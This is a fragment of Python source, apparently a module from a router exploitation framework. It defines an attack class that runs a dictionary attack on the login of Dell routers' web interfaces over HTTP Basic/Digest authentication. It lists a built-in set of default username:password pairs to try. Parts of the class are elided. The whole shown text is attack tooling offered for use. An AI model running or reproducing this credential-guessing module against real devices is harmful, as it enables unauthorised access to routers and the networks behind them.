...
class Exploit(HTTPBasicDigestDefault):
    __info__ = {
        "name": "Dell Router Default Web Interface Creds",
        "description": "Dictionary attack against Dell Router Web Interface (HTTP Basic/Digest Auth).",
    ...
    defaults = OptWordlist("admin:admin,:Dell,:Fireport,:nz0u4bbe,:1RRWTTOOI", "User:Pass or file with default credentials (file://)")
